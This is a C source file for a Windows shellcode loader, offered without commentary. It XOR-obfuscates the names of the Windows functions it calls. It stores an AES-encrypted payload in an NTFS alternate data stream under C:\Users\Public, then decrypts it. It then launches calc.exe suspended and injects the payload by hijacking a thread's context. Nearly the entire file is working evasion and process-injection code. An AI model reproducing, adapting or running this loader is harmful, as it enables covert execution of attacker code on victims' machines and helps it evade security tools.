#include <windows.h>
#include <stdio.h>
#include <wtsapi32.h>
#include <winternl.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32.lib")


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
	data[data_len] = '\0';
}

typedef BOOL (WINAPI *pWTSEnumerateProcessesA_t)(
  HANDLE             hServer,
  DWORD              Reserved,
  DWORD              Version,
  PWTS_PROCESS_INFOA *ppProcessInfo,
  DWORD              *pCount
);

typedef HMODULE (WINAPI* pLoadLibraryA_t)(
  LPCSTR lpLibFileName
);

int ListProcess(const char *procname) {

    int pid = 0;
    WTS_PROCESS_INFOA * proc_info;
    DWORD pi_count = 0;
    LPSTR process;
	char key1[] = "abdoldiduhearme";
	char sWTSEnumerateProcessesA[] = { 0x36, 0x36, 0x37, 0x2a, 0x2, 0x11, 0x4, 0x1, 0x7, 0x9, 0x11, 0x4, 0x22, 0x1f, 0xa, 0x2, 0x7, 0x17, 0x1c, 0x9, 0x17, 0x28 };
 
	char key2[] = "vvvAkyaabbayaddidyy";
	char sLoadLibraryA[] = { 0x3a, 0x19, 0x17, 0x25, 0x27, 0x10, 0x3, 0x13, 0x3, 0x10, 0x18, 0x38 };
	
 	char key3[] = "ssTYasVVVVdpdidyy";
	char skernel32[] = { 0x18, 0x16, 0x26, 0x37, 0x4, 0x1f, 0x65, 0x64, 0x78, 0x32, 0x8, 0x1c };
	
	XOR((char *) sLoadLibraryA, sizeof(sLoadLibraryA), key2, sizeof(key2));
	XOR((char *) skernel32, sizeof(skernel32), key3, sizeof(key3));
	pLoadLibraryA_t pLoadLibraryA = (pLoadLibraryA_t)GetProcAddress(GetModuleHandle(skernel32), sLoadLibraryA);
	
	char key4[] = "dsafdsgfdhydoisdtewrtsdfsdpfouohgjgyilp";
	char swtsapi32[] = { 0x13, 0x7, 0x12, 0x7, 0x14, 0x1a, 0x54, 0x54, 0x4a, 0xc, 0x15, 0x8 };
	XOR((char *) swtsapi32, sizeof(swtsapi32), key4, sizeof(key4));
	HMODULE hwtsapi32 = pLoadLibraryA(swtsapi32);
	
	XOR((char *) sWTSEnumerateProcessesA, sizeof(sWTSEnumerateProcessesA), key1, sizeof(key1));
	pWTSEnumerateProcessesA_t pWTSEnumerateProcessesA = (pWTSEnumerateProcessesA_t)GetProcAddress(hwtsapi32, sWTSEnumerateProcessesA);
    if (!pWTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &pi_count)) 
        return 0;

    for (int i = 0 ; i < pi_count ; i++ ) {

        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }

    }

    return pid;
}



typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot_t)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

typedef BOOL (WINAPI *pThread32Next_t)(
  HANDLE          hSnapshot,
  LPTHREADENTRY32 lpte
);

typedef HANDLE (WINAPI *pOpenThread_t)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwThreadId
);

HANDLE ListThread(int pid){
		
	char key1[] = "morahj";
	char sCreateToolhelp32Snapshot[] = { 0x2e, 0x1d, 0x17, 0x0, 0x1c, 0xf, 0x39, 0x0, 0x1d, 0xd, 0x0, 0xf, 0x1, 0x1f, 0x41, 0x53, 0x3b, 0x4, 0xc, 0x1f, 0x1, 0x9, 0x7, 0x1e };
	
	char key2[] = "morahj";
	char sThread32Next[] = { 0x39, 0x7, 0x0, 0x4, 0x9, 0xe, 0x5e, 0x5d, 0x3c, 0x4, 0x10, 0x1e };
	
	char key3[] = "ssTYasVVVVdpdidyy";
	char skernel32[] = { 0x18, 0x16, 0x26, 0x37, 0x4, 0x1f, 0x65, 0x64, 0x78, 0x32, 0x8, 0x1c };
	
	char key4[] = "qqqqqqqqqqq";
	char sOpenThread[] = { 0x3e, 0x1, 0x14, 0x1f, 0x25, 0x19, 0x3, 0x14, 0x10, 0x15 };
	
	XOR((char *) skernel32, sizeof(skernel32), key3, sizeof(key3));
	XOR((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), key1, sizeof(key1));
	pCreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot_t)GetProcAddress(GetModuleHandle(skernel32), sCreateToolhelp32Snapshot);
	XOR((char *) sThread32Next, sizeof(sThread32Next), key2, sizeof(key2));
	pThread32Next_t pThread32Next = (pThread32Next_t)GetProcAddress(GetModuleHandle(skernel32), sThread32Next);
	XOR((char *) sOpenThread, sizeof(sOpenThread), key4, sizeof(key4));
	pOpenThread_t pOpenThread = (pOpenThread_t)GetProcAddress(GetModuleHandle(skernel32), sOpenThread);

	
	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
        HANDLE Snap = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (pThread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = pOpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}

typedef LPVOID (WINAPI *pVirtualAllocEx_t)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

typedef BOOL (WINAPI *pWriteProcessMemory_t)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

typedef WORD (WINAPI *pSuspendThread_t)(
  HANDLE hThread
);

typedef BOOL (WINAPI *pSetThreadContext_t)(
  HANDLE        hThread,
  const CONTEXT *lpContext
);

int InjectThd(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	// find a thread in target process
	hThread = ListThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}
	
	char key3[] = "ssTYasVVVVdpdidyy";
	char skernel32[] = { 0x18, 0x16, 0x26, 0x37, 0x4, 0x1f, 0x65, 0x64, 0x78, 0x32, 0x8, 0x1c };
	
	char key2[] = "ssTYasVVVVdpdidyys";
	char sVirtualAllocEx[] = { 0x25, 0x1a, 0x26, 0x2d, 0x14, 0x12, 0x3a, 0x17, 0x3a, 0x3a, 0xb, 0x13, 0x21, 0x11 };
	
	char key1[] = "qweyyuiuyiyuiyui";
	char sWriteProcessMemory[] = { 0x26, 0x5, 0xc, 0xd, 0x1c, 0x25, 0x1b, 0x1a, 0x1a, 0xc, 0xa, 0x6, 0x24, 0x1c, 0x18, 0x6, 0x3, 0xe };
	
	char key4[] = "iuoghbdf";
	char sSuspendThread[] = { 0x3a, 0x0, 0x1c, 0x17, 0xd, 0xc, 0x0, 0x32, 0x1, 0x7, 0xa, 0x6, 0xc };
	
	XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key2, sizeof(key2));
	XOR((char *) skernel32, sizeof(skernel32), key3, sizeof(key3));
	
	pVirtualAllocEx_t pVirtualAllocEx = (pVirtualAllocEx_t)GetProcAddress(GetModuleHandle(skernel32), sVirtualAllocEx);
	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	
	XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key1, sizeof(key1));
	pWriteProcessMemory_t pWriteProcessMemory = (pWriteProcessMemory_t)GetProcAddress(GetModuleHandle(skernel32), sWriteProcessMemory);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	XOR((char *) sSuspendThread, sizeof(sSuspendThread), key4, sizeof(key4));
	pSuspendThread_t pSuspendThread = (pSuspendThread_t)GetProcAddress(GetModuleHandle(skernel32), sSuspendThread);
	pSuspendThread(hThread);	

	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
	#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode;
	#else
	ctx.Rip = (DWORD_PTR) pRemoteCode;
	#endif
	char key6[] = "asdasdawdjljkl";
	char sSetThreadContext[] = { 0x32, 0x16, 0x10, 0x35, 0x1b, 0x16, 0x4, 0x16, 0x0, 0x29, 0x3, 0x4, 0x1f, 0x9, 0x19, 0x7 };
	XOR((char *) sSetThreadContext, sizeof(sSetThreadContext), key6, sizeof(key6));
	pSetThreadContext_t pSetThreadContext = (pSetThreadContext_t)GetProcAddress(GetModuleHandle(skernel32), sSetThreadContext);
	pSetThreadContext(hThread, &ctx);
	
	return ResumeThread(hThread);	
}

typedef BOOL (WINAPI *pCryptAcquireContextW_t)(
  HCRYPTPROV *phProv,
  LPCWSTR    szContainer,
  LPCWSTR    szProvider,
  DWORD      dwProvType,
  DWORD      dwFlags
);

typedef BOOL (WINAPI *pCryptCreateHash_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTKEY  hKey,
  DWORD      dwFlags,
  HCRYPTHASH *phHash
);

typedef BOOL (WINAPI *pCryptHashData_t)(
  HCRYPTHASH hHash,
  const BYTE *pbData,
  DWORD      dwDataLen,
  DWORD      dwFlags
);
typedef BOOL (WINAPI *pCryptDeriveKey_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTHASH hBaseData,
  DWORD      dwFlags,
  HCRYPTKEY  *phKey
);

typedef BOOL (WINAPI *pCryptDecrypt_t)(
  HCRYPTKEY  hKey,
  HCRYPTHASH hHash,
  BOOL       Final,
  DWORD      dwFlags,
  BYTE       *pbData,
  DWORD      *pdwDataLen
);

typedef BOOL (WINAPI *pCryptReleaseContext_t)(
  HCRYPTPROV hProv,
  DWORD      dwFlags
);

typedef BOOL (WINAPI *pCryptDestroyHash_t)(
  HCRYPTHASH hHash
);

typedef BOOL (WINAPI *pCryptDestroyKey_t)(
  HCRYPTKEY hKey
);
void DecryptAES(char* coode, DWORD codeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
	
	char key3[] = "ssTYasVVVVdpdidyy";
	char sAdvapi32[] = { 0x32, 0x17, 0x22, 0x38, 0x11, 0x1a, 0x65, 0x64, 0x78, 0x32, 0x8, 0x1c };
	char sCryptAcquireContextW[] = { 0x30, 0x1, 0x2d, 0x29, 0x15, 0x32, 0x35, 0x27, 0x23, 0x3f, 0x16, 0x15, 0x27, 0x6, 0xa, 0xd, 0x1c, 0xb, 0x7, 0x3 };
	XOR((char *) sAdvapi32, sizeof(sAdvapi32), key3, sizeof(key3));
	XOR((char *) sCryptAcquireContextW, sizeof(sCryptAcquireContextW), key3, sizeof(key3));

	pCryptAcquireContextW_t pCryptAcquireContextW = (pCryptAcquireContextW_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptAcquireContextW);
    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
	
	char key2[] = "cvbnghjgujrtytytr";
	char sCryptCreateHash[] = { 0x20, 0x4, 0x1b, 0x1e, 0x13, 0x2b, 0x18, 0x2, 0x14, 0x1e, 0x17, 0x3c, 0x18, 0x7, 0x11 };
	XOR((char *) sCryptCreateHash, sizeof(sCryptCreateHash), key2, sizeof(key2));
	pCryptCreateHash_t pCryptCreateHash = (pCryptCreateHash_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptCreateHash);
    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
	
	char key1[] = "fhdgertwtey5te4rw";
	char sCryptHashData[] = { 0x25, 0x1a, 0x1d, 0x17, 0x11, 0x3a, 0x15, 0x4, 0x1c, 0x21, 0x18, 0x41, 0x15 };
	XOR((char *) sCryptHashData, sizeof(sCryptHashData), key1, sizeof(key1));
	pCryptHashData_t pCryptHashData = (pCryptHashData_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptHashData);
    if (!pCryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
	
	char key5[] = "hgfhfghfghfghfghc567";
	char sCryptDeriveKey[] = { 0x2b, 0x15, 0x1f, 0x18, 0x12, 0x23, 0xd, 0x14, 0xe, 0x1e, 0x3, 0x2c, 0xd, 0x1f };
	XOR((char *) sCryptDeriveKey, sizeof(sCryptDeriveKey), key5, sizeof(key5));
	pCryptDeriveKey_t pCryptDeriveKey = (pCryptDeriveKey_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptDeriveKey);
    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }
	
	char key6[] = "asdasdjhgk5554srgdfhsasdrty5";
	char sCryptDecrypt[] = { 0x22, 0x1, 0x1d, 0x11, 0x7, 0x20, 0xf, 0xb, 0x15, 0x12, 0x45, 0x41 };
	XOR((char *) sCryptDecrypt, sizeof(sCryptDecrypt), key6, sizeof(key6));
	pCryptDecrypt_t pCryptDecrypt = (pCryptDecrypt_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptDecrypt);
    if (!pCryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)coode, &codeLen)) {
        DWORD dwError = GetLastError(); // Get the error code
        LPSTR lpMsgBuf;

        FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
            NULL,
            dwError,
            0,
            (LPSTR)&lpMsgBuf,
            0,
            NULL
        );

        printf("CryptDecrypt failed with error %d: %s\n", dwError, lpMsgBuf);

        // Free allocated memory
        LocalFree(lpMsgBuf);
		
		char key7[] = "wwwwlklcxzvdi";
		char sCryptReleaseContext[] = { 0x34, 0x5, 0xe, 0x7, 0x18, 0x39, 0x9, 0xf, 0x1d, 0x1b, 0x5, 0x1, 0x2a, 0x18, 0x19, 0x3, 0x12, 0x14, 0x1f };
		XOR((char *) sCryptReleaseContext, sizeof(sCryptReleaseContext), key7, sizeof(key7));
		pCryptReleaseContext_t pCryptReleaseContext = (pCryptReleaseContext_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptReleaseContext);
		pCryptReleaseContext(hProv, 0);
		
		char key8[] = "vcnfjghujtyjturtyeredssfd";
		char sCryptDestroyHash[] = { 0x35, 0x11, 0x17, 0x16, 0x1e, 0x23, 0xd, 0x6, 0x1e, 0x6, 0x16, 0x13, 0x3c, 0x14, 0x1, 0x1c };
		XOR((char *) sCryptDestroyHash, sizeof(sCryptDestroyHash), key8, sizeof(key8));
		pCryptDestroyHash_t pCryptDestroyHash = (pCryptDestroyHash_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptDestroyHash);
        pCryptDestroyHash(hHash);
		
		char key9[] = "asdqwe";
		char sCryptDestroyKey[] = { 0x22, 0x1, 0x1d, 0x1, 0x3, 0x21, 0x4, 0x0, 0x10, 0x3, 0x18, 0x1c, 0x2a, 0x16, 0x1d };
		XOR((char *) sCryptDestroyKey, sizeof(sCryptDestroyKey), key9, sizeof(key9));
		pCryptDestroyKey_t pCryptDestroyKey = (pCryptDestroyKey_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptDestroyKey);
        pCryptDestroyKey(hKey);

        return;
    }

	char key7[] = "wwwwlklcxzvdi";
	char sCryptReleaseContext[] = { 0x34, 0x5, 0xe, 0x7, 0x18, 0x39, 0x9, 0xf, 0x1d, 0x1b, 0x5, 0x1, 0x2a, 0x18, 0x19, 0x3, 0x12, 0x14, 0x1f };
	XOR((char *) sCryptReleaseContext, sizeof(sCryptReleaseContext), key7, sizeof(key7));
	pCryptReleaseContext_t pCryptReleaseContext = (pCryptReleaseContext_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptReleaseContext);
	pCryptReleaseContext(hProv, 0);
		
	char key8[] = "vcnfjghujtyjturtyeredssfd";
	char sCryptDestroyHash[] = { 0x35, 0x11, 0x17, 0x16, 0x1e, 0x23, 0xd, 0x6, 0x1e, 0x6, 0x16, 0x13, 0x3c, 0x14, 0x1, 0x1c };
	XOR((char *) sCryptDestroyHash, sizeof(sCryptDestroyHash), key8, sizeof(key8));
	pCryptDestroyHash_t pCryptDestroyHash = (pCryptDestroyHash_t)GetProcAddress(GetModuleHandle(sAdvapi32), sCryptDestroyHash);
    pCryptDestroyHash(hHash);
    // Do not call CryptDestroyKey(hKey) here.
}


typedef BOOL (WINAPI *pCreateProcessA_t)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI *pResumeThread_t)(
  HANDLE hThread
);

typedef BOOL (WINAPI *pWriteFile_t)(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);


PROCESS_INFORMATION pi = { 0 };
STARTUPINFOA si = { 0 };
HANDLE processHandle;

int main(void) {

	
	char AESkey[] = { 0x3e, 0x9c, 0x5b, 0x28, 0x34, 0x1c, 0xb5, 0x65, 0xba, 0xf5, 0xde, 0x4d, 0x0, 0xe, 0x91, 0x96 };
	char buf[] = "\x15\x9f\xbd\x5d\x35\x7d\x2e\xf3\x01\x7a\xcd\x94\xa7\x6d\x14\x88\x23\x24\x91\xb5\xf7\x36\xbc\x12\xf5\x1a\xf6\x29\x30\x27\x10\x2b\xb5\x69\x92\x2c\x57\x53\xb1\x48\xb7\x92\x05\x69\x52\x56\x33\x45\xe4\xe1\xda\x66\x74\x84\x5e\x86\x70\x79\xac\x03\xae\xb7\x28\x58\xa1\x99\xf9\x55\xc7\x74\x14\xba\x10\x7d\x84\x1b\xce\x8d\x21\x2f\x65\xbe\xdc\x81\x6e\x2e\x20\x90\xfc\xb0\xd6\x84\xac\x7a\x7d\x21\xca\x64\x95\x3a\xb1\xad\x01\x3c\x4d\x77\xa2\x60\xb4\x24\xa6\xb1\xaf\x7e\x7c\x14\x52\x2d\xdb\xeb\xf8\xa0\x3c\x70\x53\xc4\x38\xf1\x72\xac\xe6\x4f\x19\x55\xf7\x7d\x6f\x03\xf6\xd1\x86\x85\x75\x6c\x69\xc5\x57\xe9\x05\x48\x68\xed\xc1\xf8\x4a\xe5\x93\x35\x39\x40\x05\xde\x1e\x93\x1b\xd6\x10\x7c\x94\xec\x30\xe2\xdf\xe9\x57\xa0\x33\x04\xe9\x7f\xa1\x35\x64\x85\xe1\xa6\xfc\x1a\xe0\x0f\x67\xa0\xaa\x30\xd5\x07\x54\x60\x71\x57\x94\x09\x4f\x11\x2f\x40\x96\x0e\x9c\x0d\xe4\xf4\xa0\x47\xd6\x8d\x15\x8e\xf8\x24\xb8\x88\x32\xe3\x72\x83\x47\xce\x89\x29\x66\xeb\x57\xfc\xec\xc3\x5d\x56\xed\x6e\x78\x2d\x27\x8d\x28\x0e\x5f\x13\xfe\xc4\xf0\x08\x0e\x97\x3d\x53\x4f\x24\x90\xc2\x1f\xc9\x8d\xf9\xf7\x3d\x39\x0d\x6c\xe3\x80\x1b\xe7\x75\xc4\xb0\xb4\xf2\x9f\xd0\xf7\x43\x4c\xb3\x21\xf6\x86\x21\x5b\x27\xad\x8c\xdb\xba\x9f\x64\x13\x6c\xfe\x41\x70\xe8\x36\x49\x1f\xba\x8c\x03\x77\x13\x18\x69\x28\xd8\xa1\xd8\x50\x23\x18\x32\x18\xca\x3f\xcd\xd1\x54\xe1\x3c\xdd\xf2\x6f\xa4\xfa\x42\x30\xec\x9f\x0b\x23\xbc\xd9\xd4\x96\xfd\xa2\x4b\xd3\x33\x89\x8c\xa3\xfa\xd4\x0e\x4f\x5d\xd7\xfc\xff\x3a\x9a\x9e\xfe\xf3\xb8\xe3\xda\x9f\x30\x6f\x9b\xe5\x01\x1f\xa4\x3e\xbc\x2c\x9a\x20\x87\x34\x1d\x95\x29\xb4\x76\x8f\x4c\x0b\xd6\x36\x0b\x86\x0d\xca\x00\xdf\xf3\x8a\x6f\x25\x76\x9d\x08\x87\x0b\xb2\xf9\x89\xfb\x54\x2d\x28\xca\x89\x1e\x77\xc6\xb4\xbc\x3c\x01\xb9\x8e\x20\xef\x28\x79\x31\x18\x65\x96\x1c\x6f\xcc\x13\x62\x72\x29\x9a\x82\x85\xbd\x3b\xf8\x63\x5d\x47\x7d\x9f\x49\x45\x51\x4c\x95\x5b\x91\x14\x7a\x47\xe2\x2e\xed";
	unsigned int buf_len = sizeof(buf);
	
	char key3[] = "xcbgjgyjgukyutyrtgsfd";
	char skernel32[] = { 0x33, 0x6, 0x10, 0x9, 0xf, 0xb, 0x4a, 0x58, 0x49, 0x11, 0x7, 0x15 };
	
	
	char* filename = "C:\\Users\\Public\\log.txt";
    char* streamname = "log.txt";
    char fullpath[2024];
	sprintf(fullpath, "%s:%s", filename, streamname);
	
	HANDLE hFile = CreateFile(fullpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	char key5[] = "sdfsdfsdfsdsdf";
	char sWriteFile[] = { 0x24, 0x16, 0xf, 0x7, 0x1, 0x20, 0x1a, 0x8, 0x3 };
	XOR((char *) sWriteFile, sizeof(sWriteFile), key5, sizeof(key5));
	pWriteFile_t pWriteFile = (pWriteFile_t)GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteFile);
    pWriteFile(hFile, buf, sizeof(buf) - 1, NULL, NULL);
    CloseHandle(hFile);

    hFile = CreateFile(fullpath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);    
    unsigned char data[sizeof(buf) - 1];
	unsigned int data_len = sizeof(data);
    ReadFile(hFile, data, sizeof(data), NULL, NULL);
	//if (memcmp(buf, data, sizeof(buf)) == 0) {
	if (memcmp(buf, data, data_len) == 0) {
		printf("Its OK");
	}else{
		printf("Its not OK");
	}
	
    CloseHandle(hFile);
	
	
    int pid = 0;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	HANDLE processHandle;
	char key1[] = "NOORANETNOORANETNOORANET";
	char sCreateProcessA[] = { 0xd, 0x3d, 0x2a, 0x33, 0x35, 0x2b, 0x15, 0x26, 0x21, 0x2c, 0x2a, 0x21, 0x32, 0xf };

	XOR((char *) sCreateProcessA, sizeof(sCreateProcessA), key1, sizeof(key1));
	pCreateProcessA_t pCreateProcessA = (pCreateProcessA_t)GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateProcessA);
	pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	processHandle = pi.hProcess;

	pid = ListProcess("calc.exe");
	
	char key2[] = "rrrrrrrrqqweqwe";
	char sResumeThread[] = { 0x20, 0x17, 0x1, 0x7, 0x1f, 0x17, 0x26, 0x1a, 0x3, 0x14, 0x16, 0x1 };
	XOR((char *) sResumeThread, sizeof(sResumeThread), key2, sizeof(key2));
	XOR((char *) skernel32, sizeof(skernel32), key3, sizeof(key3));
	pResumeThread_t pResumeThread = (pResumeThread_t)GetProcAddress(GetModuleHandle(skernel32), sResumeThread);
	
	if (pid) {
	if ((HANDLE)processHandle != NULL) {
			DecryptAES((char *)data, data_len, AESkey, sizeof(AESkey));
            InjectThd(pid, (HANDLE)processHandle, data, data_len);
			printf("PID = %d\n", pid);
			
			HANDLE hProc = NULL;
			if (pResumeThread(pi.hThread) == -1) {
            printf("Error resuming process");
			} else {
            printf("Process resumed");
			}
            CloseHandle(processHandle);
	}}
    return 0;	
	
}
